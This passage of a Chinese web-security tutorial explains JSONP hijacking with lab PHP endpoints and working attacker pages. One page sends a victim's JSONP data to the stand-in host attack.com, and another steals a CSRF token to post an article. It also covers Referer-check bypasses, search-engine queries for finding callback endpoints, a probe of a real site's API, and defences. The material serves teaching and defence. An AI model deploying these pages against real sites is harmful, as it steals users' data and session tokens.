title="Demo1——窃取用户信息"></a>Demo1——窃取用户信息</h4><p>这里我们模拟一个登录站点，登录后可与JSONP端点交互获取用户信息；而攻击者则是在自己服务器放置恶意HTML文件来尝试劫持用户JSONP数据。</p><p>main.php，放置于目标站点，用于用户登录以及与JSONP端点交互获取用户信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$name = $_GET[&apos;name&apos;];</span><br><span class="line">$pwd = $_GET[&apos;pwd&apos;];</span><br><span class="line">if($name===&apos;admin&apos; &amp;&amp; $pwd === &apos;admin&apos; || $name===&apos;guest&apos; &amp;&amp; $pwd === &apos;guest&apos;)&#123;</span><br><span class="line">$_SESSION[&apos;name&apos;] = $name;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&apos;logout&apos;])) &#123;</span><br><span class="line">if ($_GET[&apos;logout&apos;] === &apos;1&apos;) &#123;</span><br><span class="line">unset($_SESSION[&apos;name&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;&lt;a href=&quot;http://victim.com/info.php?callback=jsonp&quot;&gt;用户信息&lt;/a&gt;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;a href=&quot;http://victim.com/main.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br data-tomark-pass&gt;&apos;;</span><br><span class="line">if(!$_SESSION[&apos;name&apos;])&#123;</span><br><span class="line">echo &apos;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;登录&lt;/title&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;main.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;login&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;欢迎您, &quot;.$_SESSION[&apos;name&apos;].&quot;&lt;br data-tomark-pass&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>info.php，放置于目标服务器中，JSONP端点，用于提供指定用户的信息，注意这里设置了Content-Type为application/json，防御了JSONP XSS漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'name'</span>] === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $callback.<span class="string">"(&#123;'id':1,'name':'mi1k7ea_admin'&#125;)"</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>($_SESSION[<span class="string">'name'</span>] === <span class="string">'guest'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $callback.<span class="string">"(&#123;'id':2,'name':'mi1k7ea_guest'&#125;)"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $callback.<span class="string">"获取个人信息失败"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hijacking.html，放置在攻击者服务器中，用于诱使受害者访问，以窃取目标站点JSONP端点的敏感信息并发往攻击者服务器中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>lol<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_hack</span><span class="params">(v)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">alert(<span class="string">"JSONP hijacking"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> h = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> v)&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">a = key + <span class="string">' : '</span> + v[key] + <span class="string">' ,'</span>;</span></span><br><span class="line"><span class="undefined">h += a;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">alert(h);</span></span><br><span class="line"><span class="javascript">$.get(<span class="string">'http://attack.com/index.html?value='</span>+h);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://victim.com/info.php?callback=jsonp_hack"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户访问目标站点main.php，是个登录界面：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/1.png" alt=""></p><p>直接点击用户信息返回失败，因为没有登录，另外由于这里响应包Content-Type为application/json，因此在浏览器页面是看不到返回的JSONP数据的，只能在开发者工具中查看原始数据看到：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/2.png" alt=""></p><p>接着用户登录admin账号，此时再点击用户信息能够正常查看：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/3.png" alt=""></p><p><img src="/2019/08/20/JSONP跨域漏洞总结/4.png" alt=""></p><p>此后，攻击者向用户发送恶意链接诱使用户点击访问，当用户被诱导访问该恶意链接之后，恶意页面就会窃取JSONP端点数据并通过XHR的方式发往攻击者的服务器：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/5.png" alt=""></p><p>可以看到，弹完框后，会向攻击者目标站点通过GET方式发送JSONP端点敏感信息。</p><p>我们在ceye中验证，确实收到了劫持的JSONP数据：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/6.png" alt=""></p><h4 id="Demo2——劫持token"><a href="#Demo2——劫持token" class="headerlink" title="Demo2——劫持token"></a>Demo2——劫持token</h4><p>下面的示例模拟通过JSONP劫持窃取token来发表文章的情形。</p><p>add_article.php，放置于目标服务器中，功能是发表文章，前提是token值成功校验通过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'token'</span>]))&#123;</span><br><span class="line">$csrf_token = $_POST[<span class="string">'token'</span>];</span><br><span class="line">$title = $_POST[<span class="string">'title'</span>];</span><br><span class="line">$content = $_POST[<span class="string">'content'</span>];</span><br><span class="line"><span class="keyword">if</span> ($csrf_token === <span class="string">'NKJJDkajwdadwdad_csrf_token_test'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'文章发表成功~'</span>.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $title.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'csrf token error'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'no token'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>token.php，放置于JSONP端点，用于动态生成JSONP数据，其中包含token内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'callback'</span>]))&#123;</span><br><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line"><span class="keyword">print</span> $callback.<span class="string">'(&#123;"username" : "mi1k7ea", "password" : "thisispassword", "token" : "NKJJDkajwdadwdad_csrf_token_test"&#125;);'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'No callback param.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>jsonp.html，攻击者用于诱使用户访问的文件，放置于攻击者服务器中，用于访问目标JSONP端点获取token之后，再带上该token向目标服务器的add_article.php发起请求来发表文章：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Hijacking<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.17.166:81/add_article.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"csrfsend"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">"Hacked by mi1k7ea!"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"title"</span> <span class="attr">value</span>=<span class="string">"Oops!"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"token"</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">exp</span><span class="params">(obj)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(obj);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> token = obj[<span class="string">"token"</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value = token;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">"csrfsend"</span>).submit();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.17.166:81/token.php?callback=exp"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当用户被诱使访问该恶意页面时，会成功创建文章：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/15.png" alt=""></p><h4 id="Referer绕过"><a href="#Referer绕过" class="headerlink" title="Referer绕过"></a>Referer绕过</h4><p>有些时候，目标服务端会校验Referer字段，此时可以根据一些特定设置进行特定的绕过。</p><h5 id="空Referer"><a href="#空Referer" class="headerlink" title="空Referer"></a>空Referer</h5><p>有时候程序对Referer进行了校验，但并未对空Referer进行校验，此时我们就可以使用置空的Referer请求来绕过。</p><p>实现发送空Referer的请求的方法有三种：</p><ul><li>使用iframe标签+javascript伪协议</li><li>从HTTPS向HTTP发起请求</li><li>使用meta标签</li></ul><p><strong>使用iframe标签+javascript伪协议</strong></p><p>原理就是在恶意HTML中，给iframe标签的src属性赋值为javascript://伪协议内容，其中具体内容为和之前一样的定义两个script标签、一个定义callback函数具体操作、另一个则是通过script标签的src属性向目标JSONP端点发起跨域请求。</p><p>jsonp.html，恶意页面，iframe标签通过javascript伪协议定义script标签的src属性来跨域访问目标JSONP端点，并弹框显示password内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Hijacking<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:'&lt;script&gt;function exp(o)&#123;alert(o.password);&#125;&lt;/script&gt;&lt;script src=http://192.168.17.166:81/data.php?callback=exp&gt;&lt;/script&gt;'"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>data.php，目标JSONP端点，保存着用户数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'callback'</span>]))&#123;</span><br><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line"><span class="keyword">print</span> $callback.<span class="string">'(&#123;"username" : "mi1k7ea", "password" : "thisispassword"&#125;);'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'No callback param.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用户访问恶意页面后，正常弹框显示目标JSONP端点的password数据，可以看到请求头并不存在Referer：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/19.png" alt=""></p><p><strong>使用meta标签</strong></p><p>实现方法就是在我们实现的JSONP劫持的HTML文档中加上meta标签来实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"referrer"</span> <span class="attr">content</span>=<span class="string">"never"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们以Demo1来试下效果，在hijacking.html中插入meta标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>lol<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"referrer"</span> <span class="attr">content</span>=<span class="string">"never"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_hack</span><span class="params">(v)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">alert(<span class="string">"JSONP hijacking"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> h = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> v)&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">a = key + <span class="string">' : '</span> + v[key] + <span class="string">' ,'</span>;</span></span><br><span class="line"><span class="undefined">h += a;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">alert(h);</span></span><br><span class="line"><span class="javascript">$.get(<span class="string">'http://attack.com/index.html?value='</span>+h);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://victim.com/info.php?callback=jsonp_hack"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看下效果吧，添加之前是有Referer的：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/16.png" alt=""></p><p>添加之后就没有了：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/17.png" alt=""></p><h5 id="Referer过滤不严格"><a href="#Referer过滤不严格" class="headerlink" title="Referer过滤不严格"></a>Referer过滤不严格</h5><p>当然，Referer过滤不严格的情况各种各样，具体的需要自行进行针对性的分析和绕过。</p><p>如果是判断Referer是否存在白名单域名，如只是判断Referer字段值中是否存在mi1k7ea.com字样。那么此时攻击者可以通过子域名的方式如<code>http://www.mi1k7ea.com.attack.com/attack.html</code> 或者在域名前面增加随机的a-z和0-9或者构造<code>http://www.attack.com/attack.html?mi1k7ea.com</code>这样的页面来发起攻击实现绕过Referer防御。</p><h2 id="0x03-搜索方法"><a href="#0x03-搜索方法" class="headerlink" title="0x03 搜索方法"></a>0x03 搜索方法</h2><p>当然还是Google Hack大法，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inurl:json</span><br><span class="line">inurl:callback=</span><br><span class="line">site:a.com inurl:json</span><br></pre></td></tr></table></figure><p>常见关键字有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">callback</span><br><span class="line">jsoncallback</span><br><span class="line">jsonpcallback</span><br><span class="line">jsoncall</span><br><span class="line">jsonpcall</span><br><span class="line">cb</span><br><span class="line">jsoncb</span><br><span class="line">jsonpcb</span><br><span class="line">=json</span><br><span class="line">=jsonp</span><br><span class="line">=jQuery</span><br></pre></td></tr></table></figure><p>此外，还可以在对目标站点浏览时，打开F12开发者工具，点击network窗口并勾选preserve log，查看请求记录并进行关键词筛选。</p><p>筛选过后需要确实是否是真的JSONP方法，我们将目标URL填入下面的script标签的src中，将callback参数值改为我们自己定义的JS函数callback即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Hijacking<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./jquery-3.3.1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">(v)</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(v);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript">s.src = <span class="string">'http://sapi.beibei.com/resource/utm_source.html?callback=callback'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(s);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改之后访问该HTML文件，若在浏览器的控制台看到输出了JSONP数据内容，则确定是真的JSONP端点。这里访问的是贝贝网的API：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/18.png" alt=""></p><p>至于信息是否有用，得看看价值了。</p><h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ul><li>若可行，则使用CORS替换JSONP实现跨域功能；</li><li>应用CSRF防御措施来调用JSON文件：限制Referer 、部署Token等；</li><li>严格设置Content-Type及编码（Content-Type: application/json; charset=utf-8 ）；</li><li>严格过滤 callback 函数名及JSON里数据的输出；</li><li>严格限制对JSONP输出callback函数名的长度（如防御Flash输出的方法）；</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">JSONP 安全攻防技术</a></p><p><a href="https://www.freebuf.com/articles/web/126347.html" target="_blank" rel="noopener">JSONP注入解析</a></p><p><a href="http://sh1yan.top/2018/08/12/jsonp-study/" target="_blank" rel="noopener">对jsonp劫持的一次简单了解</a></p><p><a href="https://www.runoob.com/json/json-jsonp.html" target="_blank" rel="noopener">JSONP 教程</a></p><p><a href="https://www.jianshu.com/p/eacf1952d860" target="_blank" rel="noopener">Json劫持与jsonp劫持的区别</a></p><p><a href="https://blog.spoock.com/2016/04/12/json-hijacking/" target="_blank" rel="noopener">Json劫持漏洞简介</a></p><p><a href="https://zhengbao.wang/jsonp%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">jsonp劫持漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
